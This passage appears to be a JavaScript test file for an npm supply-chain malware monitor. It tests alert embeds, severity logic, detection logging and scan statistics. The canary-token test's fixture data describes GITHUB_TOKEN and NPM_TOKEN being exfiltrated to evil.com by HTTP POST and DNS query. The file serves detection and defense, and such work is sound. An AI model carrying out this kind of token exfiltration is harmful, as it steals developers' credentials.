    assert(e.color === 0xe67e22, 'Color should be orange for HIGH, got ' + e.color);

    const pkgField = e.fields.find(f => f.name === 'Package');
    assert(pkgField, 'Should have Package field');
    assertIncludes(pkgField.value, 'spammy-pkg', 'Package field should contain package name');

    const versionsField = e.fields.find(f => f.name === 'Versions Analyzed');
    assert(versionsField, 'Should have Versions Analyzed field');
    assertIncludes(versionsField.value, '15', 'Should show version count');

    const anomaliesField = e.fields.find(f => f.name === 'Anomalies Detected');
    assert(anomaliesField, 'Should have Anomalies Detected field');
    assertIncludes(anomaliesField.value, 'publish_burst', 'Should contain anomaly type');

    assert(e.footer && e.footer.text, 'Should have footer');
    assertIncludes(e.footer.text, 'Publish Frequency Analysis', 'Footer should mention Publish Frequency Analysis');
  });

  test('MONITOR: buildPublishAnomalyWebhookEmbed uses red color for CRITICAL dormant_spike', () => {
    const mockResult = {
      packageName: 'dormant-pkg',
      suspicious: true,
      versionCount: 20,
      anomalies: [
        { type: 'dormant_spike', severity: 'HIGH', description: 'Package dormant for 200 days, then suddenly updated' }
      ]
    };
    const embed = buildPublishAnomalyWebhookEmbed(mockResult);
    const e = embed.embeds[0];
    assert(e.color === 0xe67e22, 'Color should be orange for HIGH, got ' + e.color);
    assertIncludes(e.title, 'HIGH', 'Title should contain HIGH');
  });

  test('MONITOR: buildPublishAnomalyWebhookEmbed handles multiple anomalies', () => {
    const mockResult = {
      packageName: 'multi-anomaly-pkg',
      suspicious: true,
      versionCount: 30,
      anomalies: [
        { type: 'publish_burst', severity: 'HIGH', description: '4 versions in 24h' },
        { type: 'rapid_succession', severity: 'MEDIUM', description: '2 versions in 30 minutes' }
      ]
    };
    const embed = buildPublishAnomalyWebhookEmbed(mockResult);
    const anomaliesField = embed.embeds[0].fields.find(f => f.name === 'Anomalies Detected');
    assertIncludes(anomaliesField.value, 'publish_burst', 'Should contain publish_burst');
    assertIncludes(anomaliesField.value, 'rapid_succession', 'Should contain rapid_succession');
  });

  test('MONITOR: buildPublishAnomalyWebhookEmbed uses yellow color for MEDIUM severity', () => {
    const mockResult = {
      packageName: 'rapid-pkg',
      suspicious: true,
      versionCount: 10,
      anomalies: [
        { type: 'rapid_succession', severity: 'MEDIUM', description: '2 versions in 45 minutes' }
      ]
    };
    const embed = buildPublishAnomalyWebhookEmbed(mockResult);
    const e = embed.embeds[0];
    assert(e.color === 0xf1c40f, 'Color should be yellow for MEDIUM, got ' + e.color);
    assertIncludes(e.title, 'MEDIUM', 'Title should contain MEDIUM');
  });

  // ============================================
  // MONITOR TEMPORAL MAINTAINER ANALYSIS TESTS
  // ============================================

  console.log('\n=== MONITOR TEMPORAL MAINTAINER ANALYSIS TESTS ===\n');

  test('MONITOR: isTemporalMaintainerEnabled defaults to true', () => {
    const orig = process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER;
    delete process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER;
    assert(isTemporalMaintainerEnabled() === true, 'Should default to true');
    if (orig !== undefined) process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER = orig;
  });

  test('MONITOR: isTemporalMaintainerEnabled returns false when env=false', () => {
    const orig = process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER;
    process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER = 'false';
    assert(isTemporalMaintainerEnabled() === false, 'Should be false when env=false');
    if (orig !== undefined) process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER = orig;
    else delete process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER;
  });

  test('MONITOR: isTemporalMaintainerEnabled returns false when env=FALSE (case insensitive)', () => {
    const orig = process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER;
    process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER = 'FALSE';
    assert(isTemporalMaintainerEnabled() === false, 'Should be false when env=FALSE');
    if (orig !== undefined) process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER = orig;
    else delete process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER;
  });

  test('MONITOR: buildMaintainerChangeWebhookEmbed has correct Discord embed structure', () => {
    const mockResult = {
      packageName: 'suspicious-pkg',
      suspicious: true,
      findings: [
        {
          type: 'sole_maintainer_change',
          severity: 'CRITICAL',
          maintainer: { name: 'npm-user-99999', email: '' },
          previousMaintainer: { name: 'trusteddev', email: '' },
          riskAssessment: { riskLevel: 'HIGH', reasons: ['Generic name pattern: "npm-user-99999"'] },
          description: "Sole maintainer changed from 'trusteddev' to 'npm-user-99999'"
        }
      ],
      maintainers: { current: [{ name: 'npm-user-99999', email: '' }], count: 1 }
    };
    const embed = buildMaintainerChangeWebhookEmbed(mockResult);
    assert(embed.embeds && embed.embeds.length === 1, 'Should have one embed');
    const e = embed.embeds[0];
    assertIncludes(e.title, 'MAINTAINER CHANGE', 'Title should contain MAINTAINER CHANGE');
    assertIncludes(e.title, 'CRITICAL', 'Title should contain CRITICAL');
    assert(e.color === 0xe74c3c, 'Color should be red for CRITICAL');
    const pkgField = e.fields.find(f => f.name === 'Package');
    assertIncludes(pkgField.value, 'suspicious-pkg', 'Package field should contain package name');
    const findingsField = e.fields.find(f => f.name === 'Findings');
    assertIncludes(findingsField.value, 'sole_maintainer_change', 'Should contain finding type');
    assertIncludes(findingsField.value, 'Generic name pattern', 'Should contain risk reason');
  });

  test('MONITOR: buildMaintainerChangeWebhookEmbed uses orange color for HIGH severity', () => {
    const mockResult = {
      packageName: 'new-maint-pkg',
      suspicious: true,
      findings: [
        {
          type: 'new_maintainer',
          severity: 'HIGH',
          maintainer: { name: 'newguy', email: '' },
          riskAssessment: { riskLevel: 'LOW', reasons: [] },
          description: "New maintainer 'newguy' added between v1.0.0 and v2.0.0"
        }
      ],
      maintainers: { current: [{ name: 'original', email: '' }, { name: 'newguy', email: '' }], count: 2 }
    };
    const embed = buildMaintainerChangeWebhookEmbed(mockResult);
    const e = embed.embeds[0];
    assert(e.color === 0xe67e22, 'Color should be orange for HIGH, got ' + e.color);
    assertIncludes(e.title, 'HIGH', 'Title should contain HIGH');
  });

  test('MONITOR: buildMaintainerChangeWebhookEmbed handles multiple findings', () => {
    const mockResult = {
      packageName: 'multi-issue-pkg',
      suspicious: true,
      findings: [
        {
          type: 'new_maintainer',
          severity: 'CRITICAL',
          maintainer: { name: 'npm-user-hacker', email: '' },
          riskAssessment: { riskLevel: 'HIGH', reasons: ['Generic name pattern: "npm-user-hacker"'] },
          description: "New maintainer 'npm-user-hacker' added"
        },
        {
          type: 'new_publisher',
          severity: 'HIGH',
          maintainer: { name: 'npm-user-hacker', email: '' },
          previousPublisher: { name: 'original-dev', email: '' },
          riskAssessment: { riskLevel: 'HIGH', reasons: ['Generic name pattern: "npm-user-hacker"'] },
          description: "New publisher 'npm-user-hacker' (previously 'original-dev')"
        }
      ],
      maintainers: { current: [{ name: 'npm-user-hacker', email: '' }], count: 1 }
    };
    const embed = buildMaintainerChangeWebhookEmbed(mockResult);
    const findingsField = embed.embeds[0].fields.find(f => f.name === 'Findings');
    assertIncludes(findingsField.value, 'new_maintainer', 'Should contain new_maintainer');
    assertIncludes(findingsField.value, 'new_publisher', 'Should contain new_publisher');
  });

  // ============================================
  // MONITOR CANARY TOKEN TESTS
  // ============================================

  console.log('\n=== MONITOR CANARY TOKEN TESTS ===\n');

  test('MONITOR: isCanaryEnabled defaults to true', () => {
    const orig = process.env.MUADDIB_MONITOR_CANARY;
    delete process.env.MUADDIB_MONITOR_CANARY;
    assert(isCanaryEnabled() === true, 'Should default to true');
    if (orig !== undefined) process.env.MUADDIB_MONITOR_CANARY = orig;
  });

  test('MONITOR: isCanaryEnabled returns false when env=false', () => {
    const orig = process.env.MUADDIB_MONITOR_CANARY;
    process.env.MUADDIB_MONITOR_CANARY = 'false';
    assert(isCanaryEnabled() === false, 'Should be false when env=false');
    if (orig !== undefined) process.env.MUADDIB_MONITOR_CANARY = orig;
    else delete process.env.MUADDIB_MONITOR_CANARY;
  });

  test('MONITOR: isCanaryEnabled returns false when env=FALSE (case insensitive)', () => {
    const orig = process.env.MUADDIB_MONITOR_CANARY;
    process.env.MUADDIB_MONITOR_CANARY = 'FALSE';
    assert(isCanaryEnabled() === false, 'Should be false when env=FALSE');
    if (orig !== undefined) process.env.MUADDIB_MONITOR_CANARY = orig;
    else delete process.env.MUADDIB_MONITOR_CANARY;
  });

  test('MONITOR: buildCanaryExfiltrationWebhookEmbed has correct Discord embed structure', () => {
    const exfiltrations = [
      { token: 'GITHUB_TOKEN', foundIn: 'HTTP POST body to evil.com' },
      { token: 'NPM_TOKEN', foundIn: 'DNS query: npm_MUADDIB_CANARY_xxx.evil.com' }
    ];
    const embed = buildCanaryExfiltrationWebhookEmbed('malicious-pkg', '1.0.0', exfiltrations);
    assert(embed.embeds && embed.embeds.length === 1, 'Should have one embed');
    const e = embed.embeds[0];
    assertIncludes(e.title, 'CANARY EXFILTRATION', 'Title should contain CANARY EXFILTRATION');
    assertIncludes(e.title, 'CRITICAL', 'Title should contain CRITICAL');
    assert(e.color === 0xe74c3c, 'Color should be red for CRITICAL');
    const pkgField = e.fields.find(f => f.name === 'Package');
    assertIncludes(pkgField.value, 'malicious-pkg', 'Package field should contain package name');
    const tokensField = e.fields.find(f => f.name === 'Exfiltrated Tokens');
    assertIncludes(tokensField.value, 'GITHUB_TOKEN', 'Should contain GITHUB_TOKEN');
    assertIncludes(tokensField.value, 'NPM_TOKEN', 'Should contain NPM_TOKEN');
    const actionField = e.fields.find(f => f.name === 'Action');
    assertIncludes(actionField.value, 'CONFIRMED MALICIOUS', 'Action should say CONFIRMED MALICIOUS');
  });

  // --- Temporal webhook suppression when sandbox is CLEAN ---

  test('MONITOR: shouldSendWebhook returns false when sandbox score is 0 (temporal false positive)', () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://discord.com/api/webhooks/test/test';
    try {
      const mockResultIOC = { summary: { critical: 1, high: 0, medium: 0, low: 0 }, threats: [
        { type: 'known_malicious_package', severity: 'CRITICAL' }
      ] };
      const mockResultNoIOC = { summary: { critical: 1, high: 0, medium: 0, low: 0 }, threats: [
        { type: 'shell_exec', severity: 'CRITICAL' }
      ] };
      const mockSandboxClean = { score: 0, severity: 'CLEAN', findings: [] };
      const mockSandboxSuspect = { score: 60, severity: 'HIGH', findings: [{ type: 'suspicious_dns' }] };

      // IOC match → always send, even with sandbox CLEAN
      assert(shouldSendWebhook(mockResultIOC, mockSandboxClean) === true,
        'IOC match must ALWAYS send, even when sandbox is CLEAN');

      // Sandbox SUSPECT → send webhook
      assert(shouldSendWebhook(mockResultIOC, mockSandboxSuspect) === true,
        'Should send webhook when sandbox score > 30');

      // No sandbox + IOC match → send webhook
      assert(shouldSendWebhook(mockResultIOC, null) === true,
        'Should send webhook when no sandbox ran and IOC match found');

      // No sandbox + no IOC match → no webhook
      assert(shouldSendWebhook(mockResultNoIOC, null) === false,
        'Should NOT send webhook when no sandbox ran and no IOC match');
    } finally {
      if (origEnv === undefined) delete process.env.MUADDIB_WEBHOOK_URL;
      else process.env.MUADDIB_WEBHOOK_URL = origEnv;
    }
  });

  test('MONITOR: temporal webhook suppressed when static scan is CLEAN and no sandbox (MEDIUM/LOW)', () => {
    // Simulate the decision logic from resolveTarballAndScan:
    // If staticClean=true and sandboxResult=null AND temporal is MEDIUM/LOW → no webhook (false positive)
    // If staticClean=false and sandboxResult=null → send webhook (static found threats)
    // If staticClean=true and sandboxResult.score=0 → no webhook (sandbox confirms clean)
    // If staticClean=true and temporal is CRITICAL/HIGH → SUSPECT (send webhook)

    function shouldSendTemporalWebhook(staticClean, sandboxResult, temporalMaxSev) {
      if (sandboxResult && sandboxResult.score === 0) return false;
      if (staticClean && !sandboxResult) {
        // CRITICAL/HIGH temporal cannot be downgraded
        if (temporalMaxSev === 'CRITICAL' || temporalMaxSev === 'HIGH') return true;
        return false;
      }
      return true;
    }

    assert(shouldSendTemporalWebhook(true, null, 'MEDIUM') === false,
      'Static CLEAN + no sandbox + temporal MEDIUM → no temporal webhook');
    assert(shouldSendTemporalWebhook(true, null, 'LOW') === false,
      'Static CLEAN + no sandbox + temporal LOW → no temporal webhook');
    assert(shouldSendTemporalWebhook(true, null, 'CRITICAL') === true,
      'Static CLEAN + no sandbox + temporal CRITICAL → SUSPECT, send webhook');
    assert(shouldSendTemporalWebhook(true, null, 'HIGH') === true,
      'Static CLEAN + no sandbox + temporal HIGH → SUSPECT, send webhook');
    assert(shouldSendTemporalWebhook(true, { score: 0 }, 'CRITICAL') === false,
      'Static CLEAN + sandbox CLEAN → no temporal webhook (even if CRITICAL)');
    assert(shouldSendTemporalWebhook(false, null, 'MEDIUM') === true,
      'Static SUSPECT + no sandbox → send temporal webhook');
    assert(shouldSendTemporalWebhook(false, { score: 60 }, 'HIGH') === true,
      'Static SUSPECT + sandbox SUSPECT → send temporal webhook');
    assert(shouldSendTemporalWebhook(false, { score: 0 }, 'CRITICAL') === false,
      'Static SUSPECT + sandbox CLEAN → no temporal webhook');
    assert(shouldSendTemporalWebhook(true, { score: 60 }, 'HIGH') === true,
      'Static CLEAN + sandbox SUSPECT → send temporal webhook');
  });

  // ============================================
  // TEMPORAL MAX SEVERITY HELPER TESTS
  // ============================================

  console.log('\n=== TEMPORAL MAX SEVERITY TESTS ===\n');

  test('MONITOR: getTemporalMaxSeverity returns CRITICAL when lifecycle has CRITICAL', () => {
    const temporal = { suspicious: true, findings: [{ severity: 'CRITICAL', type: 'lifecycle_added', script: 'postinstall' }] };
    assert(getTemporalMaxSeverity(temporal, null, null, null) === 'CRITICAL',
      'Should return CRITICAL');
  });

  test('MONITOR: getTemporalMaxSeverity returns HIGH from AST result', () => {
    const ast = { suspicious: true, findings: [{ severity: 'HIGH', pattern: 'child_process' }] };
    assert(getTemporalMaxSeverity(null, ast, null, null) === 'HIGH',
      'Should return HIGH from AST');
  });

  test('MONITOR: getTemporalMaxSeverity returns highest across multiple sources', () => {
    const temporal = { suspicious: true, findings: [{ severity: 'MEDIUM' }] };
    const ast = { suspicious: true, findings: [{ severity: 'HIGH' }] };
    const publish = { suspicious: true, anomalies: [{ severity: 'LOW' }] };
    const maintainer = { suspicious: true, findings: [{ severity: 'CRITICAL' }] };
    assert(getTemporalMaxSeverity(temporal, ast, publish, maintainer) === 'CRITICAL',
      'Should return CRITICAL as highest across all sources');
  });

  test('MONITOR: getTemporalMaxSeverity returns null when no findings', () => {
    assert(getTemporalMaxSeverity(null, null, null, null) === null,
      'Should return null when all null');
  });

  test('MONITOR: getTemporalMaxSeverity ignores non-suspicious results', () => {
    const temporal = { suspicious: false, findings: [{ severity: 'CRITICAL' }] };
    assert(getTemporalMaxSeverity(temporal, null, null, null) === null,
      'Should return null when suspicious=false even with CRITICAL findings');
  });

  test('MONITOR: getTemporalMaxSeverity ignores publish anomalies (excluded from severity calc)', () => {
    const publish = { suspicious: true, anomalies: [{ severity: 'MEDIUM' }] };
    assert(getTemporalMaxSeverity(null, null, publish, null) === null,
      'Should return null — publish anomalies excluded from severity calculation');
  });

  test('MONITOR: getTemporalMaxSeverity handles empty findings arrays', () => {
    const temporal = { suspicious: true, findings: [] };
    assert(getTemporalMaxSeverity(temporal, null, null, null) === null,
      'Should return null for empty findings');
  });

  test('MONITOR: getTemporalMaxSeverity picks HIGH over MEDIUM from mixed sources', () => {
    const temporal = { suspicious: true, findings: [{ severity: 'MEDIUM' }] };
    const ast = { suspicious: true, findings: [{ severity: 'HIGH' }] };
    assert(getTemporalMaxSeverity(temporal, ast, null, null) === 'HIGH',
      'Should return HIGH as max of MEDIUM and HIGH');
  });

  // ============================================
  // MONITOR PUBLISH ANOMALY ALONE SUPPRESSION TESTS
  // ============================================

  console.log('\n=== MONITOR PUBLISH ANOMALY ALONE SUPPRESSION TESTS ===\n');

  test('MONITOR: isPublishAnomalyOnly returns true when only publish is suspicious', () => {
    const publishResult = { suspicious: true, anomalies: [{ type: 'publish_burst', severity: 'HIGH' }] };
    assert(isPublishAnomalyOnly(null, null, publishResult, null) === true,
      'Should return true when only publish is suspicious');
  });

  test('MONITOR: isPublishAnomalyOnly returns false when publish + lifecycle are suspicious', () => {
    const publishResult = { suspicious: true, anomalies: [{ type: 'publish_burst', severity: 'HIGH' }] };
    const temporalResult = { suspicious: true, findings: [{ type: 'lifecycle_added', script: 'postinstall', severity: 'CRITICAL' }] };
    assert(isPublishAnomalyOnly(temporalResult, null, publishResult, null) === false,
      'Should return false when publish + lifecycle are suspicious');
  });

  test('MONITOR: isPublishAnomalyOnly returns false when publish + AST are suspicious', () => {
    const publishResult = { suspicious: true, anomalies: [{ type: 'rapid_succession', severity: 'MEDIUM' }] };
    const astResult = { suspicious: true, findings: [{ pattern: 'child_process', severity: 'CRITICAL' }] };
    assert(isPublishAnomalyOnly(null, astResult, publishResult, null) === false,
      'Should return false when publish + AST are suspicious');
  });

  test('MONITOR: isPublishAnomalyOnly returns false when publish + maintainer are suspicious', () => {
    const publishResult = { suspicious: true, anomalies: [{ type: 'publish_burst', severity: 'HIGH' }] };
    const maintainerResult = { suspicious: true, findings: [{ type: 'sole_maintainer_change', severity: 'CRITICAL' }] };
    assert(isPublishAnomalyOnly(null, null, publishResult, maintainerResult) === false,
      'Should return false when publish + maintainer are suspicious');
  });

  test('MONITOR: isPublishAnomalyOnly returns false when only lifecycle is suspicious (no publish)', () => {
    const temporalResult = { suspicious: true, findings: [{ type: 'lifecycle_added', script: 'postinstall', severity: 'CRITICAL' }] };
    assert(isPublishAnomalyOnly(temporalResult, null, null, null) === false,
      'Should return false when lifecycle is suspicious without publish');
  });

  test('MONITOR: isPublishAnomalyOnly returns false when nothing is suspicious', () => {
    assert(isPublishAnomalyOnly(null, null, null, null) === false,
      'Should return false when nothing is suspicious');
  });

  test('MONITOR: isPublishAnomalyOnly returns false when publish suspicious=false', () => {
    const publishResult = { suspicious: false, anomalies: [] };
    assert(isPublishAnomalyOnly(null, null, publishResult, null) === false,
      'Should return false when publish.suspicious is false');
  });

  test('MONITOR: isPublishAnomalyOnly returns false when all four are suspicious', () => {
    const temporalResult = { suspicious: true, findings: [] };
    const astResult = { suspicious: true, findings: [] };
    const publishResult = { suspicious: true, anomalies: [] };
    const maintainerResult = { suspicious: true, findings: [] };
    assert(isPublishAnomalyOnly(temporalResult, astResult, publishResult, maintainerResult) === false,
      'Should return false when all four are suspicious');
  });

  // ============================================
  // DETECTION TIME LOGGING TESTS
  // ============================================

  console.log('\n=== DETECTION TIME LOGGING TESTS ===\n');

  test('MONITOR: appendDetection creates file and adds entry', () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-detect-'));
    const tmpFile = path.join(tmpDir, 'detections.json');
    // Temporarily override DETECTIONS_FILE by writing directly
    try {
      // Simulate appendDetection logic with a temp file
      const data = { detections: [] };
      data.detections.push({
        package: 'evil-pkg',
        version: '1.0.0',
        ecosystem: 'npm',
        first_seen_at: new Date().toISOString(),
        findings: ['shell_exec', 'obfuscation'],
        severity: 'CRITICAL',
        advisory_at: null,
        lead_time_hours: null
      });
      fs.writeFileSync(tmpFile, JSON.stringify(data, null, 2), 'utf8');

      const result = JSON.parse(fs.readFileSync(tmpFile, 'utf8'));
      assert(result.detections.length === 1, 'Should have 1 detection');
      assert(result.detections[0].package === 'evil-pkg', 'Package should be evil-pkg');
      assert(result.detections[0].severity === 'CRITICAL', 'Severity should be CRITICAL');
      assert(result.detections[0].findings.length === 2, 'Should have 2 findings');
      assert(result.detections[0].advisory_at === null, 'advisory_at should be null');
      assert(result.detections[0].lead_time_hours === null, 'lead_time_hours should be null');
    } finally {
      try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch {}
    }
  });

  test('MONITOR: appendDetection deduplicates same name@version', () => {
    // Use the actual appendDetection function — it writes to DETECTIONS_FILE
    // We need to ensure it doesn't exist before, then clean up after
    const backupExists = fs.existsSync(DETECTIONS_FILE);
    let backup = null;
    if (backupExists) {
      backup = fs.readFileSync(DETECTIONS_FILE, 'utf8');
    }
    try {
      // Clear the file
      const dir = path.dirname(DETECTIONS_FILE);
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      fs.writeFileSync(DETECTIONS_FILE, JSON.stringify({ detections: [] }), 'utf8');

      appendDetection('dedup-pkg', '2.0.0', 'npm', ['eval'], 'HIGH');
      appendDetection('dedup-pkg', '2.0.0', 'npm', ['eval', 'obfuscation'], 'CRITICAL');

      const data = loadDetections();
      assert(data.detections.length === 1, 'Should have 1 detection (deduped), got ' + data.detections.length);
      assert(data.detections[0].severity === 'HIGH', 'Should keep first entry severity');
    } finally {
      if (backup !== null) {
        fs.writeFileSync(DETECTIONS_FILE, backup, 'utf8');
      } else {
        try { fs.unlinkSync(DETECTIONS_FILE); } catch {}
      }
    }
  });

  test('MONITOR: loadDetections returns empty structure when file missing', () => {
    const backupExists = fs.existsSync(DETECTIONS_FILE);
    let backup = null;
    if (backupExists) {
      backup = fs.readFileSync(DETECTIONS_FILE, 'utf8');
    }
    try {
      try { fs.unlinkSync(DETECTIONS_FILE); } catch {}
      const data = loadDetections();
      assert(Array.isArray(data.detections), 'detections should be an array');
      assert(data.detections.length === 0, 'Should be empty when file missing');
    } finally {
      if (backup !== null) {
        fs.writeFileSync(DETECTIONS_FILE, backup, 'utf8');
      }
    }
  });

  test('MONITOR: loadDetections returns persisted data', () => {
    const backupExists = fs.existsSync(DETECTIONS_FILE);
    let backup = null;
    if (backupExists) {
      backup = fs.readFileSync(DETECTIONS_FILE, 'utf8');
    }
    try {
      const dir = path.dirname(DETECTIONS_FILE);
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      const testData = {
        detections: [
          { package: 'a', version: '1.0.0', ecosystem: 'npm', first_seen_at: '2026-01-01T00:00:00.000Z', findings: ['eval'], severity: 'HIGH', advisory_at: null, lead_time_hours: null }
        ]
      };
      fs.writeFileSync(DETECTIONS_FILE, JSON.stringify(testData), 'utf8');
      const data = loadDetections();
      assert(data.detections.length === 1, 'Should have 1 detection');
      assert(data.detections[0].package === 'a', 'Package should be a');
    } finally {
      if (backup !== null) {
        fs.writeFileSync(DETECTIONS_FILE, backup, 'utf8');
      } else {
        try { fs.unlinkSync(DETECTIONS_FILE); } catch {}
      }
    }
  });

  test('MONITOR: getDetectionStats computes correct counts', () => {
    const backupExists = fs.existsSync(DETECTIONS_FILE);
    let backup = null;
    if (backupExists) {
      backup = fs.readFileSync(DETECTIONS_FILE, 'utf8');
    }
    try {
      const dir = path.dirname(DETECTIONS_FILE);
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      const testData = {
        detections: [
          { package: 'a', version: '1.0.0', ecosystem: 'npm', findings: ['eval'], severity: 'CRITICAL', advisory_at: null, lead_time_hours: null },
          { package: 'b', version: '2.0.0', ecosystem: 'pypi', findings: ['shell'], severity: 'HIGH', advisory_at: null, lead_time_hours: null },
          { package: 'c', version: '1.0.0', ecosystem: 'npm', findings: ['obfuscation'], severity: 'CRITICAL', advisory_at: null, lead_time_hours: null }
        ]
      };
      fs.writeFileSync(DETECTIONS_FILE, JSON.stringify(testData), 'utf8');
      const s = getDetectionStats();
      assert(s.total === 3, 'Total should be 3, got ' + s.total);
      assert(s.bySeverity.CRITICAL === 2, 'CRITICAL should be 2');
      assert(s.bySeverity.HIGH === 1, 'HIGH should be 1');
      assert(s.byEcosystem.npm === 2, 'npm should be 2');
      assert(s.byEcosystem.pypi === 1, 'pypi should be 1');
      assert(s.leadTime === null, 'leadTime should be null when no advisory data');
    } finally {
      if (backup !== null) {
        fs.writeFileSync(DETECTIONS_FILE, backup, 'utf8');
      } else {
        try { fs.unlinkSync(DETECTIONS_FILE); } catch {}
      }
    }
  });

  test('MONITOR: getDetectionStats computes lead_time when advisory_at is set', () => {
    const backupExists = fs.existsSync(DETECTIONS_FILE);
    let backup = null;
    if (backupExists) {
      backup = fs.readFileSync(DETECTIONS_FILE, 'utf8');
    }
    try {
      const dir = path.dirname(DETECTIONS_FILE);
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      const testData = {
        detections: [
          { package: 'a', version: '1.0.0', ecosystem: 'npm', findings: ['eval'], severity: 'HIGH', advisory_at: '2026-01-02T00:00:00.000Z', lead_time_hours: 24 },
          { package: 'b', version: '1.0.0', ecosystem: 'npm', findings: ['shell'], severity: 'CRITICAL', advisory_at: '2026-01-03T00:00:00.000Z', lead_time_hours: 48 },
          { package: 'c', version: '1.0.0', ecosystem: 'pypi', findings: ['obfuscation'], severity: 'MEDIUM', advisory_at: null, lead_time_hours: null }
        ]
      };
      fs.writeFileSync(DETECTIONS_FILE, JSON.stringify(testData), 'utf8');
      const s = getDetectionStats();
      assert(s.leadTime !== null, 'leadTime should not be null');
      assert(s.leadTime.count === 2, 'leadTime count should be 2');
      assert(s.leadTime.avg === 36, 'leadTime avg should be 36, got ' + s.leadTime.avg);
      assert(s.leadTime.min === 24, 'leadTime min should be 24');
      assert(s.leadTime.max === 48, 'leadTime max should be 48');
    } finally {
      if (backup !== null) {
        fs.writeFileSync(DETECTIONS_FILE, backup, 'utf8');
      } else {
        try { fs.unlinkSync(DETECTIONS_FILE); } catch {}
      }
    }
  });

  // ============================================
  // SCAN STATS (FP RATE TRACKING) TESTS
  // ============================================

  console.log('\n=== SCAN STATS (FP RATE TRACKING) TESTS ===\n');

  test('MONITOR: loadScanStats returns default structure when file missing', () => {
    const backupExists = fs.existsSync(SCAN_STATS_FILE);
    let backup = null;
    if (backupExists) {
      backup = fs.readFileSync(SCAN_STATS_FILE, 'utf8');
    }
    try {
      try { fs.unlinkSync(SCAN_STATS_FILE); } catch {}
      const data = loadScanStats();
      assert(data.stats.total_scanned === 0, 'total_scanned should be 0');
      assert(data.stats.clean === 0, 'clean should be 0');
      assert(data.stats.suspect === 0, 'suspect should be 0');
      assert(data.stats.false_positive === 0, 'false_positive should be 0');
      assert(data.stats.confirmed_malicious === 0, 'confirmed_malicious should be 0');
      assert(Array.isArray(data.daily), 'daily should be array');
      assert(data.daily.length === 0, 'daily should be empty');
    } finally {
      if (backup !== null) {
        fs.writeFileSync(SCAN_STATS_FILE, backup, 'utf8');
      }
    }
  });

  test('MONITOR: updateScanStats clean increments clean + total_scanned', () => {
    const backupExists = fs.existsSync(SCAN_STATS_FILE);
    let backup = null;
    if (backupExists) {
      backup = fs.readFileSync(SCAN_STATS_FILE, 'utf8');
    }
    try {
      const dir = path.dirname(SCAN_STATS_FILE);
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      fs.writeFileSync(SCAN_STATS_FILE, JSON.stringify({ stats: { total_scanned: 0, clean: 0, suspect: 0, false_positive: 0, confirmed_malicious: 0 }, daily: [] }), 'utf8');

      updateScanStats('clean');
      const data = loadScanStats();
      assert(data.stats.total_scanned === 1, 'total_scanned should be 1, got ' + data.stats.total_scanned);
      assert(data.stats.clean === 1, 'clean should be 1, got ' + data.stats.clean);
      assert(data.stats.suspect === 0, 'suspect should still be 0');
    } finally {
      if (backup !== null) {
        fs.writeFileSync(SCAN_STATS_FILE, backup, 'utf8');
      } else {
        try { fs.unlinkSync(SCAN_STATS_FILE); } catch {}
      }
    }
  });

  test('MONITOR: updateScanStats false_positive increments false_positive + total_scanned', () => {
    const backupExists = fs.existsSync(SCAN_STATS_FILE);
    let backup = null;
    if (backupExists) {
      backup = fs.readFileSync(SCAN_STATS_FILE, 'utf8');
    }
    try {
      const dir = path.dirname(SCAN_STATS_FILE);
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      fs.writeFileSync(SCAN_STATS_FILE, JSON.stringify({ stats: { total_scanned: 0, clean: 0, suspect: 0, false_positive: 0, confirmed_malicious: 0 }, daily: [] }), 'utf8');

      updateScanStats('false_positive');
      const data = loadScanStats();
      assert(data.stats.total_scanned === 1, 'total_scanned should be 1');
      assert(data.stats.false_positive === 1, 'false_positive should be 1');
    } finally {
      if (backup !== null) {
        fs.writeFileSync(SCAN_STATS_FILE, backup, 'utf8');
      } else {
        try { fs.unlinkSync(SCAN_STATS_FILE); } catch {}
      }
    }
  });

  test('MONITOR: updateScanStats confirmed increments confirmed_malicious + total_scanned', () => {
    const backupExists = fs.existsSync(SCAN_STATS_FILE);
    let backup = null;
    if (backupExists) {
      backup = fs.readFileSync(SCAN_STATS_FILE, 'utf8');
    }
    try {
      const dir = path.dirname(SCAN_STATS_FILE);
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      fs.writeFileSync(SCAN_STATS_FILE, JSON.stringify({ stats: { total_scanned: 0, clean: 0, suspect: 0, false_positive: 0, confirmed_malicious: 0 }, daily: [] }), 'utf8');

      updateScanStats('confirmed');
      const data = loadScanStats();
      assert(data.stats.total_scanned === 1, 'total_scanned should be 1');
      assert(data.stats.confirmed_malicious === 1, 'confirmed_malicious should be 1');
    } finally {
      if (backup !== null) {
        fs.writeFileSync(SCAN_STATS_FILE, backup, 'utf8');
      } else {
        try { fs.unlinkSync(SCAN_STATS_FILE); } catch {}
      }
    }
  });

  test('MONITOR: updateScanStats creates daily entry with today date', () => {
    const backupExists = fs.existsSync(SCAN_STATS_FILE);
    let backup = null;
    if (backupExists) {
      backup = fs.readFileSync(SCAN_STATS_FILE, 'utf8');
    }
    try {
      const dir = path.dirname(SCAN_STATS_FILE);
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      fs.writeFileSync(SCAN_STATS_FILE, JSON.stringify({ stats: { total_scanned: 0, clean: 0, suspect: 0, false_positive: 0, confirmed_malicious: 0 }, daily: [] }), 'utf8');

      updateScanStats('clean');
      const data = loadScanStats();
